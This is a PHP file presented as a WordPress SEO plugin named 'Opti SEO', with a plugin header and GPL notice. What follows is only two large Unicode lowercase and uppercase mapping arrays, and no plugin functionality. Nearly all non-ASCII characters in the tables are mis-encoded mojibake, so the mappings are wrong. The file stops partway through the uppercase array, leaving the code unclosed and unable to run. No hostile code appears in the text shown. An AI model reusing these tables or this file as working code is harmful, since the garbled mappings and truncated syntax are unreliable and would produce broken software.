<?php

/*
Plugin Name: Opti SEO
Plugin URI: http://optionseo.weebly.com
Description: With the Opti Seo you can Override titles, descriptions and keywords with page/post level input.
Author: Martin Jones
Version: 1.5
*/

/*
Copyright (C) 2014  Martin Jones(jonesviewer@gmx.com)

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*******************************************************************************************************/

$UTF8_TABLES['strtolower'] = array(
	"Ôº∫" => "ÔΩö",	"Ôºπ" => "ÔΩô",	"Ôº∏" => "ÔΩò",
	"Ôº∑" => "ÔΩó",	"Ôº∂" => "ÔΩñ",	"Ôºµ" => "ÔΩï",
	"Ôº¥" => "ÔΩî",	"Ôº≥" => "ÔΩì",	"Ôº≤" => "ÔΩí",
	"Ôº±" => "ÔΩë",	"Ôº∞" => "ÔΩê",	"ÔºØ" => "ÔΩè",
	"ÔºÆ" => "ÔΩé",	"Ôº≠" => "ÔΩç",	"Ôº¨" => "ÔΩå",
	"Ôº´" => "ÔΩã",	"Ôº™" => "ÔΩä",	"Ôº©" => "ÔΩâ",
	"Ôº®" => "ÔΩà",	"Ôºß" => "ÔΩá",	"Ôº¶" => "ÔΩÜ",
	"Ôº•" => "ÔΩÖ",	"Ôº§" => "ÔΩÑ",	"Ôº£" => "ÔΩÉ",
	"Ôº¢" => "ÔΩÇ",	"Ôº°" => "ÔΩÅ",	"‚Ñ´" => "√•",
	"‚Ñ™" => "k",	"‚Ñ¶" => "œâ",	"·øª" => "·ΩΩ",
	"·ø∫" => "·Ωº",	"·øπ" => "·Ωπ",	"·ø∏" => "·Ω∏",
	"·ø¨" => "·ø•",	"·ø´" => "·Ωª",	"·ø™" => "·Ω∫",
	"·ø©" => "·ø°",	"·ø®" => "·ø ",	"·øõ" => "·Ω∑",
	"·øö" => "·Ω∂",	"·øô" => "·øë",	"·øò" => "·øê",
	"·øã" => "·Ωµ",	"·øä" => "·Ω¥",	"·øâ" => "·Ω≥",
	"·øà" => "·Ω≤",	"·æª" => "·Ω±",	"·æ∫" => "·Ω∞",
	"·æπ" => "·æ±",	"·æ∏" => "·æ∞",	"·ΩØ" => "·Ωß",
	"·ΩÆ" => "·Ω¶",	"·Ω≠" => "·Ω•",	"·Ω¨" => "·Ω§",
	"·Ω´" => "·Ω£",	"·Ω™" => "·Ω¢",	"·Ω©" => "·Ω°",
	"·Ω®" => "·Ω ",	"·Ωü" => "·Ωó",	"·Ωù" => "·Ωï",
	"·Ωõ" => "·Ωì",	"·Ωô" => "·Ωë",	"·Ωç" => "·ΩÖ",
	"·Ωå" => "·ΩÑ",	"·Ωã" => "·ΩÉ",	"·Ωä" => "·ΩÇ",
	"·Ωâ" => "·ΩÅ",	"·Ωà" => "·ΩÄ",	"·ºø" => "·º∑",
	"·ºæ" => "·º∂",	"·ºΩ" => "·ºµ",	"·ºº" => "·º¥",
	"·ºª" => "·º≥",	"·º∫" => "·º≤",	"·ºπ" => "·º±",
	"·º∏" => "·º∞",	"·ºØ" => "·ºß",	"·ºÆ" => "·º¶",
	"·º≠" => "·º•",	"·º¨" => "·º§",	"·º´" => "·º£",
	"·º™" => "·º¢",	"·º©" => "·º°",	"·º®" => "·º ",
	"·ºù" => "·ºï",	"·ºú" => "·ºî",	"·ºõ" => "·ºì",
	"·ºö" => "·ºí",	"·ºô" => "·ºë",	"·ºò" => "·ºê",
	"·ºè" => "·ºá",	"·ºé" => "·ºÜ",	"·ºç" => "·ºÖ",
	"·ºå" => "·ºÑ",	"·ºã" => "·ºÉ",	"·ºä" => "·ºÇ",
	"·ºâ" => "·ºÅ",	"·ºà" => "·ºÄ",	"·ª∏" => "·ªπ",
	"·ª∂" => "·ª∑",	"·ª¥" => "·ªµ",	"·ª≤" => "·ª≥",
	"·ª∞" => "·ª±",	"·ªÆ" => "·ªØ",	"·ª¨" => "·ª≠",
	"·ª™" => "·ª´",	"·ª®" => "·ª©",	"·ª¶" => "·ªß",
	"·ª§" => "·ª•",	"·ª¢" => "·ª£",	"·ª " => "·ª°",
	"·ªû" => "·ªü",	"·ªú" => "·ªù",	"·ªö" => "·ªõ",
	"·ªò" => "·ªô",	"·ªñ" => "·ªó",	"·ªî" => "·ªï",
	"·ªí" => "·ªì",	"·ªê" => "·ªë",	"·ªé" => "·ªè",
	"·ªå" => "·ªç",	"·ªä" => "·ªã",	"·ªà" => "·ªâ",
	"·ªÜ" => "·ªá",	"·ªÑ" => "·ªÖ",	"·ªÇ" => "·ªÉ",
	"·ªÄ" => "·ªÅ",	"·∫æ" => "·∫ø",	"·∫º" => "·∫Ω",
	"·∫∫" => "·∫ª",	"·∫∏" => "·∫π",	"·∫∂" => "·∫∑",
	"·∫¥" => "·∫µ",	"·∫≤" => "·∫≥",	"·∫∞" => "·∫±",
	"·∫Æ" => "·∫Ø",	"·∫¨" => "·∫≠",	"·∫™" => "·∫´",
	"·∫®" => "·∫©",	"·∫¶" => "·∫ß",	"·∫§" => "·∫•",
	"·∫¢" => "·∫£",	"·∫ " => "·∫°",	"·∫î" => "·∫ï",
	"·∫í" => "·∫ì",	"·∫ê" => "·∫ë",	"·∫é" => "·∫è",
	"·∫å" => "·∫ç",	"·∫ä" => "·∫ã",	"·∫à" => "·∫â",
	"·∫Ü" => "·∫á",	"·∫Ñ" => "·∫Ö",	"·∫Ç" => "·∫É",
	"·∫Ä" => "·∫Å",	"·πæ" => "·πø",	"·πº" => "·πΩ",
	"·π∫" => "·πª",	"·π∏" => "·ππ",	"·π∂" => "·π∑",
	"·π¥" => "·πµ",	"·π≤" => "·π≥",	"·π∞" => "·π±",
	"·πÆ" => "·πØ",	"·π¨" => "·π≠",	"·π™" => "·π´",
	"·π®" => "·π©",	"·π¶" => "·πß",	"·π§" => "·π•",
	"·π¢" => "·π£",	"·π " => "·π°",	"·πû" => "·πü",
	"·πú" => "·πù",	"·πö" => "·πõ",	"·πò" => "·πô",
	"·πñ" => "·πó",	"·πî" => "·πï",	"·πí" => "·πì",
	"·πê" => "·πë",	"·πé" => "·πè",	"·πå" => "·πç",
	"·πä" => "·πã",	"·πà" => "·πâ",	"·πÜ" => "·πá",
	"·πÑ" => "·πÖ",	"·πÇ" => "·πÉ",	"·πÄ" => "·πÅ",
	"·∏æ" => "·∏ø",	"·∏º" => "·∏Ω",	"·∏∫" => "·∏ª",
	"·∏∏" => "·∏π",	"·∏∂" => "·∏∑",	"·∏¥" => "·∏µ",
	"·∏≤" => "·∏≥",	"·∏∞" => "·∏±",	"·∏Æ" => "·∏Ø",
	"·∏¨" => "·∏≠",	"·∏™" => "·∏´",	"·∏®" => "·∏©",
	"·∏¶" => "·∏ß",	"·∏§" => "·∏•",	"·∏¢" => "·∏£",
	"·∏ " => "·∏°",	"·∏û" => "·∏ü",	"·∏ú" => "·∏ù",
	"·∏ö" => "·∏õ",	"·∏ò" => "·∏ô",	"·∏ñ" => "·∏ó",
	"·∏î" => "·∏ï",	"·∏í" => "·∏ì",	"·∏ê" => "·∏ë",
	"·∏é" => "·∏è",	"·∏å" => "·∏ç",	"·∏ä" => "·∏ã",
	"·∏à" => "·∏â",	"·∏Ü" => "·∏á",	"·∏Ñ" => "·∏Ö",
	"·∏Ç" => "·∏É",	"·∏Ä" => "·∏Å",	"’ñ" => "÷Ü",
	"’ï" => "÷Ö",	"’î" => "÷Ñ",	"’ì" => "÷É",
	"’í" => "÷Ç",	"’ë" => "÷Å",	"’ê" => "÷Ä",
	"’è" => "’ø",	"’é" => "’æ",	"’ç" => "’Ω",
	"’å" => "’º",	"’ã" => "’ª",	"’ä" => "’∫",
	"’â" => "’π",	"’à" => "’∏",	"’á" => "’∑",
	"’Ü" => "’∂",	"’Ö" => "’µ",	"’Ñ" => "’¥",
	"’É" => "’≥",	"’Ç" => "’≤",	"’Å" => "’±",
	"’Ä" => "’∞",	"‘ø" => "’Ø",	"‘æ" => "’Æ",
	"‘Ω" => "’≠",	"‘º" => "’¨",	"‘ª" => "’´",
	"‘∫" => "’™",	"‘π" => "’©",	"‘∏" => "’®",
	"‘∑" => "’ß",	"‘∂" => "’¶",	"‘µ" => "’•",
	"‘¥" => "’§",	"‘≥" => "’£",	"‘≤" => "’¢",
	"‘±" => "’°",	"‘é" => "‘è",	"‘å" => "‘ç",
	"‘ä" => "‘ã",	"‘à" => "‘â",	"‘Ü" => "‘á",
	"‘Ñ" => "‘Ö",	"‘Ç" => "‘É",	"‘Ä" => "‘Å",
	"”∏" => "”π",	"”¥" => "”µ",	"”≤" => "”≥",
	"”∞" => "”±",	"”Æ" => "”Ø",	"”¨" => "”≠",
	"”™" => "”´",	"”®" => "”©",	"”¶" => "”ß",
	"”§" => "”•",	"”¢" => "”£",	"” " => "”°",
	"”û" => "”ü",	"”ú" => "”ù",	"”ö" => "”õ",
	"”ò" => "”ô",	"”ñ" => "”ó",	"”î" => "”ï",
	"”í" => "”ì",	"”ê" => "”ë",	"”ç" => "”é",
	"”ã" => "”å",	"”â" => "”ä",	"”á" => "”à",
	"”Ö" => "”Ü",	"”É" => "”Ñ",	"”Å" => "”Ç",
	"“æ" => "“ø",	"“º" => "“Ω",	"“∫" => "“ª",
	"“∏" => "“π",	"“∂" => "“∑",	"“¥" => "“µ",
	"“≤" => "“≥",	"“∞" => "“±",	"“Æ" => "“Ø",
	"“¨" => "“≠",	"“™" => "“´",	"“®" => "“©",
	"“¶" => "“ß",	"“§" => "“•",	"“¢" => "“£",
	"“ " => "“°",	"“û" => "“ü",	"“ú" => "“ù",
	"“ö" => "“õ",	"“ò" => "“ô",	"“ñ" => "“ó",
	"“î" => "“ï",	"“í" => "“ì",	"“ê" => "“ë",
	"“é" => "“è",	"“å" => "“ç",	"“ä" => "“ã",
	"“Ä" => "“Å",	"—æ" => "—ø",	"—º" => "—Ω",
	"—∫" => "—ª",	"—∏" => "—π",	"—∂" => "—∑",
	"—¥" => "—µ",	"—≤" => "—≥",	"—∞" => "—±",
	"—Æ" => "—Ø",	"—¨" => "—≠",	"—™" => "—´",
	"—®" => "—©",	"—¶" => "—ß",	"—§" => "—•",
	"—¢" => "—£",	"— " => "—°",	"–Ø" => "—è",
	"–Æ" => "—é",	"–≠" => "—ç",	"–¨" => "—å",
	"–´" => "—ã",	"–™" => "—ä",	"–©" => "—â",
	"–®" => "—à",	"–ß" => "—á",	"–¶" => "—Ü",
	"–•" => "—Ö",	"–§" => "—Ñ",	"–£" => "—É",
	"–¢" => "—Ç",	"–°" => "—Å",	"– " => "—Ä",
	"–ü" => "–ø",	"–û" => "–æ",	"–ù" => "–Ω",
	"–ú" => "–º",	"–õ" => "–ª",	"–ö" => "–∫",
	"–ô" => "–π",	"–ò" => "–∏",	"–ó" => "–∑",
	"–ñ" => "–∂",	"–ï" => "–µ",	"–î" => "–¥",
	"–ì" => "–≥",	"–í" => "–≤",	"–ë" => "–±",
	"–ê" => "–∞",	"–è" => "—ü",	"–é" => "—û",
	"–ç" => "—ù",	"–å" => "—ú",	"–ã" => "—õ",
	"–ä" => "—ö",	"–â" => "—ô",	"–à" => "—ò",
	"–á" => "—ó",	"–Ü" => "—ñ",	"–Ö" => "—ï",
	"–Ñ" => "—î",	"–É" => "—ì",	"–Ç" => "—í",
	"–Å" => "—ë",	"–Ä" => "—ê",	"œ¥" => "Œ∏",
	"œÆ" => "œØ",	"œ¨" => "œ≠",	"œ™" => "œ´",
	"œ®" => "œ©",	"œ¶" => "œß",	"œ§" => "œ•",
	"œ¢" => "œ£",	"œ " => "œ°",	"œû" => "œü",
	"œú" => "œù",	"œö" => "œõ",	"œò" => "œô",
	"Œ´" => "œã",	"Œ™" => "œä",	"Œ©" => "œâ",
	"Œ®" => "œà",	"Œß" => "œá",	"Œ¶" => "œÜ",
	"Œ•" => "œÖ",	"Œ§" => "œÑ",	"Œ£" => "œÉ",
	"Œ°" => "œÅ",	"Œ " => "œÄ",	"Œü" => "Œø",
	"Œû" => "Œæ",	"Œù" => "ŒΩ",	"Œú" => "Œº",
	"Œõ" => "Œª",	"Œö" => "Œ∫",	"Œô" => "Œπ",
	"Œò" => "Œ∏",	"Œó" => "Œ∑",	"Œñ" => "Œ∂",
	"Œï" => "Œµ",	"Œî" => "Œ¥",	"Œì" => "Œ≥",
	"Œí" => "Œ≤",	"Œë" => "Œ±",	"Œè" => "œé",
	"Œé" => "œç",	"Œå" => "œå",	"Œä" => "ŒØ",
	"Œâ" => "ŒÆ",	"Œà" => "Œ≠",	"ŒÜ" => "Œ¨",
	"»≤" => "»≥",	"»∞" => "»±",	"»Æ" => "»Ø",
	"»¨" => "»≠",	"»™" => "»´",	"»®" => "»©",
	"»¶" => "»ß",	"»§" => "»•",	"»¢" => "»£",
	"» " => "∆û",	"»û" => "»ü",	"»ú" => "»ù",
	"»ö" => "»õ",	"»ò" => "»ô",	"»ñ" => "»ó",
	"»î" => "»ï",	"»í" => "»ì",	"»ê" => "»ë",
	"»é" => "»è",	"»å" => "»ç",	"»ä" => "»ã",
	"»à" => "»â",	"»Ü" => "»á",	"»Ñ" => "»Ö",
	"»Ç" => "»É",	"»Ä" => "»Å",	"«æ" => "«ø",
	"«º" => "«Ω",	"«∫" => "«ª",	"«∏" => "«π",
	"«∑" => "∆ø",	"«∂" => "∆ï",	"«¥" => "«µ",
	"«±" => "«≥",	"«Æ" => "«Ø",	"«¨" => "«≠",
	"«™" => "«´",	"«®" => "«©",	"«¶" => "«ß",
	"«§" => "«•",	"«¢" => "«£",	"« " => "«°",
	"«û" => "«ü",	"«õ" => "«ú",	"«ô" => "«ö",
	"«ó" => "«ò",	"«ï" => "«ñ",	"«ì" => "«î",
	"«ë" => "«í",	"«è" => "«ê",	"«ç" => "«é",
	"«ä" => "«å",	"«á" => "«â",	"«Ñ" => "«Ü",
	"∆º" => "∆Ω",	"∆∏" => "∆π",	"∆∑" => " í",
	"∆µ" => "∆∂",	"∆≥" => "∆¥",	"∆≤" => " ã",
	"∆±" => " ä",	"∆Ø" => "∆∞",	"∆Æ" => " à",
	"∆¨" => "∆≠",	"∆©" => " É",	"∆ß" => "∆®",
	"∆¶" => " Ä",	"∆§" => "∆•",	"∆¢" => "∆£",
	"∆ " => "∆°",	"∆ü" => "…µ",	"∆ù" => "…≤",
	"∆ú" => "…Ø",	"∆ò" => "∆ô",	"∆ó" => "…®",
	"∆ñ" => "…©",	"∆î" => "…£",	"∆ì" => "… ",
	"∆ë" => "∆í",	"∆ê" => "…õ",	"∆è" => "…ô",
	"∆é" => "«ù",	"∆ã" => "∆å",	"∆ä" => "…ó",
	"∆â" => "…ñ",	"∆á" => "∆à",	"∆Ü" => "…î",
	"∆Ñ" => "∆Ö",	"∆Ç" => "∆É",	"∆Å" => "…ì",
	"≈Ω" => "≈æ",	"≈ª" => "≈º",	"≈π" => "≈∫",
	"≈∏" => "√ø",	"≈∂" => "≈∑",	"≈¥" => "≈µ",
	"≈≤" => "≈≥",	"≈∞" => "≈±",	"≈Æ" => "≈Ø",
	"≈¨" => "≈≠",	"≈™" => "≈´",	"≈®" => "≈©",
	"≈¶" => "≈ß",	"≈§" => "≈•",	"≈¢" => "≈£",
	"≈ " => "≈°",	"≈û" => "≈ü",	"≈ú" => "≈ù",
	"≈ö" => "≈õ",	"≈ò" => "≈ô",	"≈ñ" => "≈ó",
	"≈î" => "≈ï",	"≈í" => "≈ì",	"≈ê" => "≈ë",
	"≈é" => "≈è",	"≈å" => "≈ç",	"≈ä" => "≈ã",
	"≈á" => "≈à",	"≈Ö" => "≈Ü",	"≈É" => "≈Ñ",
	"≈Å" => "≈Ç",	"ƒø" => "≈Ä",	"ƒΩ" => "ƒæ",
	"ƒª" => "ƒº",	"ƒπ" => "ƒ∫",	"ƒ∂" => "ƒ∑",
	"ƒ¥" => "ƒµ",	"ƒ≤" => "ƒ≥",	"ƒ∞" => "i",
	"ƒÆ" => "ƒØ",	"ƒ¨" => "ƒ≠",	"ƒ™" => "ƒ´",
	"ƒ®" => "ƒ©",	"ƒ¶" => "ƒß",	"ƒ§" => "ƒ•",
	"ƒ¢" => "ƒ£",	"ƒ " => "ƒ°",	"ƒû" => "ƒü",
	"ƒú" => "ƒù",	"ƒö" => "ƒõ",	"ƒò" => "ƒô",
	"ƒñ" => "ƒó",	"ƒî" => "ƒï",	"ƒí" => "ƒì",
	"ƒê" => "ƒë",	"ƒé" => "ƒè",	"ƒå" => "ƒç",
	"ƒä" => "ƒã",	"ƒà" => "ƒâ",	"ƒÜ" => "ƒá",
	"ƒÑ" => "ƒÖ",	"ƒÇ" => "ƒÉ",	"ƒÄ" => "ƒÅ",
	"√û" => "√æ",	"√ù" => "√Ω",	"√ú" => "√º",
	"√õ" => "√ª",	"√ö" => "√∫",	"√ô" => "√π",
	"√ò" => "√∏",	"√ñ" => "√∂",	"√ï" => "√µ",
	"√î" => "√¥",	"√ì" => "√≥",	"√í" => "√≤",
	"√ë" => "√±",	"√ê" => "√∞",	"√è" => "√Ø",
	"√é" => "√Æ",	"√ç" => "√≠",	"√å" => "√¨",
	"√ã" => "√´",	"√ä" => "√™",	"√â" => "√©",
	"√à" => "√®",	"√á" => "√ß",	"√Ü" => "√¶",
	"√Ö" => "√•",	"√Ñ" => "√§",	"√É" => "√£",
	"√Ç" => "√¢",	"√Å" => "√°",	"√Ä" => "√ ",
	"Z" => "z",		"Y" => "y",		"X" => "x",
	"W" => "w",		"V" => "v",		"U" => "u",
	"T" => "t",		"S" => "s",		"R" => "r",
	"Q" => "q",		"P" => "p",		"O" => "o",
	"N" => "n",		"M" => "m",		"L" => "l",
	"K" => "k",		"J" => "j",		"I" => "i",
	"H" => "h",		"G" => "g",		"F" => "f",
	"E" => "e",		"D" => "d",		"C" => "c",
	"B" => "b",		"A" => "a",
);


$UTF8_TABLES['strtoupper'] = array(
	"ÔΩö" => "Ôº∫",	"ÔΩô" => "Ôºπ",	"ÔΩò" => "Ôº∏",
	"ÔΩó" => "Ôº∑",	"ÔΩñ" => "Ôº∂",	"ÔΩï" => "Ôºµ",
	"ÔΩî" => "Ôº¥",	"ÔΩì" => "Ôº≥",	"ÔΩí" => "Ôº≤",
	"ÔΩë" => "Ôº±",	"ÔΩê" => "Ôº∞",	"ÔΩè" => "ÔºØ",
	"ÔΩé" => "ÔºÆ",	"ÔΩç" => "Ôº≠",	"ÔΩå" => "Ôº¨",
	"ÔΩã" => "Ôº´",	"ÔΩä" => "Ôº™",	"ÔΩâ" => "Ôº©",
	"ÔΩà" => "Ôº®",	"ÔΩá" => "Ôºß",	"ÔΩÜ" => "Ôº¶",
	"ÔΩÖ" => "Ôº•",	"ÔΩÑ" => "Ôº§",	"ÔΩÉ" => "Ôº£",
	"ÔΩÇ" => "Ôº¢",	"ÔΩÅ" => "Ôº°",	"·ø≥" => "·øº",
	"·ø•" => "·ø¨",	"·ø°" => "·ø©",	"·ø " => "·ø®",
	"·øë" => "·øô",	"·øê" => "·øò",	"·øÉ" => "·øå",
	"·ææ" => "Œô",	"·æ≥" => "·æº",	"·æ±" => "·æπ",
	"·æ∞" => "·æ∏",	"·æß" => "·æØ",	"·æ¶" => "·æÆ",
	"·æ•" => "·æ≠",	"·æ§" => "·æ¨",	"·æ£" => "·æ´",
	"·æ¢" => "·æ™",	"·æ°" => "·æ©",	"·æ " => "·æ®",
	"·æó" => "·æü",	"·æñ" => "·æû",	"·æï" => "·æù",
	"·æî" => "·æú",	"·æì" => "·æõ",	"·æí" => "·æö",
	"·æë" => "·æô",	"·æê" => "·æò",	"·æá" => "·æè",
	"·æÜ" => "·æé",	"·æÖ" => "·æç",	"·æÑ" => "·æå",
	"·æÉ" => "·æã",	"·æÇ" => "·æä",	"·æÅ" => "·æâ",
	"·æÄ" => "·æà",	"·ΩΩ" => "·øª",	"·Ωº" => "·ø∫",
	"·Ωª" => "·ø´",	"·Ω∫" => "·ø™",	"·Ωπ" => "·øπ",
	"·Ω∏" => "·ø∏",	"·Ω∑" => "·øõ",	"·Ω∂" => "·øö",
	"·Ωµ" => "·øã",	"·Ω¥" => "·øä",	"·Ω≥" => "·øâ",
	"·Ω≤" => "·øà",	"·Ω±" => "·æª",	"·Ω∞" => "·æ∫",
	"·Ωß" => "·ΩØ",	"·Ω¶" => "·ΩÆ",	"·Ω•" => "·Ω≠",
	"·Ω§" => "·Ω¨",	"·Ω£" => "·Ω´",	"·Ω¢" => "·Ω™",
	"·Ω°" => "·Ω©",	"·Ω " => "·Ω®",	"·Ωó" => "·Ωü",
	"·Ωï" => "·Ωù",	"·Ωì" => "·Ωõ",	"·Ωë" => "·Ωô",
	"·ΩÖ" => "·Ωç",	"·ΩÑ" => "·Ωå",	"·ΩÉ" => "·Ωã",
	"·ΩÇ" => "·Ωä",	"·ΩÅ" => "·Ωâ",	"·ΩÄ" => "·Ωà",
	"·º∑" => "·ºø",	"·º∂" => "·ºæ",	"·ºµ" => "·ºΩ",
	"·º¥" => "·ºº",	"·º≥" => "·ºª",	"·º≤" => "·º∫",
	"·º±" => "·ºπ",	"·º∞" => "·º∏",	"·ºß" => "·ºØ",
	"·º¶" => "·ºÆ",	"·º•" => "·º≠",	"·º§" => "·º¨",
	"·º£" => "·º´",	"·º¢" => "·º™",	"·º°" => "·º©",
	"·º " => "·º®",	"·ºï" => "·ºù",	"·ºî" => "·ºú",
	"·ºì" => "·ºõ",	"·ºí" => "·ºö",	"·ºë" => "·ºô",
	"·ºê" => "·ºò",	"·ºá" => "·ºè",	"·ºÜ" => "·ºé",
	"·ºÖ" => "·ºç",	"·ºÑ" => "·ºå",	"·ºÉ" => "·ºã",
	"·ºÇ" => "·ºä",	"·ºÅ" => "·ºâ",	"·ºÄ" => "·ºà",
	"·ªπ" => "·ª∏",	"·ª∑" => "·ª∂",	"·ªµ" => "·ª¥",
	"·ª≥" => "·ª≤",	"·ª±" => "·ª∞",	"·ªØ" => "·ªÆ",
	"·ª≠" => "·ª¨",	"·ª´" => "·ª™",	"·ª©" => "·ª®",
	"·ªß" => "·ª¶",	"·ª•" => "·ª§",	"·ª£" => "·ª¢",
	"·ª°" => "·ª ",	"·ªü" => "·ªû",	"·ªù" => "·ªú",
	"·ªõ" => "·ªö",	"·ªô" => "·ªò",	"·ªó" => "·ªñ",
	"·ªï" => "·ªî",	"·ªì" => "·ªí",	"·ªë" => "·ªê",
	"·ªè" => "·ªé",	"·ªç" => "·ªå",	"·ªã" => "·ªä",
	"·ªâ" => "·ªà",	"·ªá" => "·ªÜ",	"·ªÖ" => "·ªÑ",
	"·ªÉ" => "·ªÇ",	"·ªÅ" => "·ªÄ",	"·∫ø" => "·∫æ",
	"·∫Ω" => "·∫º",	"·∫ª" => "·∫∫",	"·∫π" => "·∫∏",
	"·∫∑" => "·∫∂",	"·∫µ" => "·∫¥",	"·∫≥" => "·∫≤",
	"·∫±" => "·∫∞",	"·∫Ø" => "·∫Æ",	"·∫≠" => "·∫¨",
	"·∫´" => "·∫™",	"·∫©" => "·∫®",	"·∫ß" => "·∫¶",
	"·∫•" => "·∫§",	"·∫£" => "·∫¢",	"·∫°" => "·∫ ",
	"·∫õ" => "·π ",	"·∫ï" => "·∫î",	"·∫ì" => "·∫í",
	"·∫ë" => "·∫ê",	"·∫è" => "·∫é",	"·∫ç" => "·∫å",
	"·∫ã" => "·∫ä",	"·∫â" => "·∫à",	"·∫á" => "·∫Ü",
	"·∫Ö" => "·∫Ñ",	"·∫É" => "·∫Ç",	"·∫Å" => "·∫Ä",
	"·πø" => "·πæ",	"·πΩ" => "·πº",	"·πª" => "·π∫",
	"·ππ" => "·π∏",	"·π∑" => "·π∂",	"·πµ" => "·π¥",
	"·π≥" => "·π≤",	"·π±" => "·π∞",	"·πØ" => "·πÆ",
	"·π≠" => "·π¨",	"·π´" => "·π™",	"·π©" => "·π®",
	"·πß" => "·π¶",	"·π•" => "·π§",	"·π£" => "·π¢",
	"·π°" => "·π ",	"·πü" => "·πû",	"·πù" => "·πú",
	"·πõ" => "·πö",	"·πô" => "·πò",	"·πó" => "·πñ",
	"·πï" => "·πî",	"·πì" => "·πí",	"·πë" => "·πê",
	"·πè" => "·πé",	"·πç" => "·πå",	"·πã" => "·πä",
	"·πâ" => "·πà",	"·πá" => "·πÜ",	"·πÖ" => "·πÑ",
	"·πÉ" => "·πÇ",	"·πÅ" => "·πÄ",	"·∏ø" => "·∏æ",
	"·∏Ω" => "·∏º",	"·∏ª" => "·∏∫",	"·∏π" => "·∏∏",
	"·∏∑" => "·∏∂",	"·∏µ" => "·∏¥",	"·∏≥" => "·∏≤",
	"·∏±" => "·∏∞",	"·∏Ø" => "·∏Æ",	"·∏≠" => "·∏¨",
	"·∏´" => "·∏™",	"·∏©" => "·∏®",	"·∏ß" => "·∏¶",
	"·∏•" => "·∏§",	"·∏£" => "·∏¢",	"·∏°" => "·∏ ",
	"·∏ü" => "·∏û",	"·∏ù" => "·∏ú",	"·∏õ" => "·∏ö",
	"·∏ô" => "·∏ò",	"·∏ó" => "·∏ñ",	"·∏ï" => "·∏î",
	"·∏ì" => "·∏í",	"·∏ë" => "·∏ê",	"·∏è" => "·∏é",
	"·∏ç" => "·∏å",	"·∏ã" => "·∏ä",	"·∏â" => "·∏à",
	"·∏á" => "·∏Ü",	"·∏Ö" => "·∏Ñ",	"·∏É" => "·∏Ç",
	"·∏Å" => "·∏Ä",	"÷Ü" => "’ñ",	"÷Ö" => "’ï",
	"÷Ñ" => "’î",	"÷É" => "’ì",	"÷Ç" => "’í",
	"÷Å" => "’ë",	"÷Ä" => "’ê",	"’ø" => "’è",
	"’æ" => "’é",	"’Ω" => "’ç",	"’º" => "’å",
	"’ª" => "’ã",	"’∫" => "’ä",	"’π" => "’â",
	"’∏" => "’à",	"’∑" => "’á",	"’∂" => "’Ü",
	"’µ" => "’Ö",	"’¥" => "’Ñ",	"’≥" => "’É",
	"’≤" => "’Ç",	"’±" => "’Å",	"’∞" => "’Ä",
	"’Ø" => "‘ø",	"’Æ" => "‘æ",	"’≠" => "‘Ω",
	"’¨" => "‘º",	"’´" => "‘ª",	"’™" => "‘∫",
	"’©" => "‘π",	"’®" => "‘∏",	"’ß" => "‘∑",
	"’¶" => "‘∂",	"’•" => "‘µ",	"’§" => "‘¥",
	"’£" => "‘≥",	"’¢" => "‘≤",	"’°" => "‘±",
	"‘è" => "‘é",	"‘ç" => "‘å",	"‘ã" => "‘ä",
	"‘â" => "‘à",	"‘á" => "‘Ü",	"‘Ö" => "‘Ñ",
	"‘É" => "‘Ç",	"‘Å" => "‘Ä",	"”π" => "”∏",
	"”µ" => "”¥",	"”≥" => "”≤",	"”±" => "”∞",
	"”Ø" => "”Æ",	"”≠" => "”¨",	"”´" => "”™",
	"”©" => "”®",	"”ß" => "”¶",	"”•" => "”§",
	"”£" => "”¢",	"”°" => "” ",	"”ü" => "”û",
	"”ù" => "”ú",	"”õ" => "”ö",	"”ô" => "”ò",
	"”ó" => "”ñ",	"”ï" => "”î",	"”ì" => "”í",
	"”ë" => "”ê",	"”é" => "”ç",	"”å" => "”ã",
	"”ä" => "”â",	"”à" => "”á",	"”Ü" => "”Ö",
	"”Ñ" => "”É",	"”Ç" => "”Å",	"“ø" => "“æ",
	"“Ω" => "“º",	"“ª" => "“∫",	"“π" => "“∏",
	"“∑" => "“∂",	"“µ" => "“¥",	"“≥" => "“≤",
	"“±" => "“∞",	"“Ø" => "“Æ",	"“≠" => "“¨",
	"“´" => "“™",	"“©" => "“®",	"“ß" => "“¶",
	"“•" => "“§",	"“£" => "“¢",	"“°" => "“ ",
	"“ü" => "“û",	"“ù" => "“ú",	"“õ" => "“ö",
	"“ô" => "“ò",	"“ó" => "“ñ",	"“ï" => "“î",
	"“ì" => "“í",	"“ë" => "“ê",	"“è" => "“é",
	"“ç" => "“å",	"“ã" => "“ä",	"“Å" => "“Ä",
	"—ø" => "—æ",	"—Ω" => "—º",	"—ª" => "—∫",
	"—π" => "—∏",	"—∑" => "—∂",	"—µ" => "—¥",
	"—≥" => "—≤",	"—±" => "—∞",	"—Ø" => "—Æ",
	"—≠" => "—¨",	"—´" => "—™",	"—©" => "—®",
	"—ß" => "—¶",	"—•" => "—§",	"—£" => "—¢",
	"—°" => "— ",	"—ü" => "–è",	"—û" => "–é",
	"—ù" => "–ç",	"—ú" => "–å",	"—õ" => "–ã",
	"—ö" => "–ä",	"—ô" => "–â",	"—ò" => "–à",
	"—ó" => "–á",	"—ñ" => "–Ü",	"—ï" => "–Ö",
	"—î" => "–Ñ",	"—ì" => "–É",	"—í" => "–Ç",
	"—ë" => "–Å",	"—ê" => "–Ä",	"—è" => "–Ø",
	"—é" => "–Æ",	"—ç" => "–≠",	"—å" => "–¨",
	"—ã" => "–´",	"—ä" => "–™",	"—â" => "–©",
	"—à" => "–®",	"—á" => "–ß",	"—Ü" => "–¶",
	"—Ö" => "–•",	"—Ñ" => "–§",	"—É" => "–£",
	"—Ç" => "–¢",	"—Å" => "–°",	"—Ä" => "– ",
	"–ø" => "–ü",	"–æ" => "–û",	"–Ω" => "–ù",
	"–º" => "–ú",	"–ª" => "–õ",	"–∫" => "–ö",
	"–π" => "–ô",	"–∏" => "–ò",	"–∑" => "–ó",
	"–∂" => "–ñ",	"–µ" => "–ï",	"–¥" => "–î",
	"–≥" => "–ì",	"–≤" => "–í",	"–±" => "–ë",
	"–∞" => "–ê",	"œµ" => "Œï",	"œ≤" => "Œ£",
	"œ±" => "Œ°",	"œ∞" => "Œö",	"œØ" => "œÆ",
